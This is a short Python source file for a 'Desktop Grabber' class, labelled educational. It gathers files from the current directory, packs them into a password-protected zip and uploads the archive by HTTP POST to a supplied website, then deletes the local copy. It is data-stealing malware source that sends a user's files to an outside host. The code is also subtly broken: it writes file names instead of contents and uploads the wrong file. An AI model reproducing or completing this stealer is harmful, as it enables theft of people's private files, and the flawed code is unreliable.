import requests
import pyminizip
from zipfile import ZipFile
import os


# Desktop Grabber
# For educational purpose only!

class DeskGrab:

    def __init__(self, ZipName, ZipPassword):
        self.ZipName = ZipName + ".txt"
        self.ZipPassword = ZipPassword
        self.ForbExt = []
        self.SizeLimit = 8388608
        self.CurrentDir = "."

    def _dirTraversel(self, directory):
        files = os.listdir(directory)
        approved_files = []
        for i in files:
            # Checks for forbidden file ext.
            if i not in self.ForbExt:
                file_size = os.path.getsize(i)
                if not file_size >= self.SizeLimit:
                    approved_files.append(i)
                else: print("File To Large!")

        return approved_files


    def _createZip(self, file_list):
        compress_level = 5
        output_file = "test2.zip"
        # Creating the zipfile
        try:
            with open(self.ZipName, "w") as fa:
                for i in file_list:
                    fa.write(i)
                fa.close()
            pyminizip.compress(self.ZipName, None, output_file, self.ZipPassword, compress_level)
            return True
        except: return False



    def _sendPackage(self, website):
        # We use a simple POST request to send file
        try:
            file = open(str(self.ZipName), "rb").read()
            response = requests.post(website, files={"archive": ("Test.zip", file)})
        except: print(1)

        if response.ok:
            print("Upload completed successfully!")
            print(response.text)
            os.remove(self.ZipName)
            return True
        else:
            print("Something went wrong!")
            return False



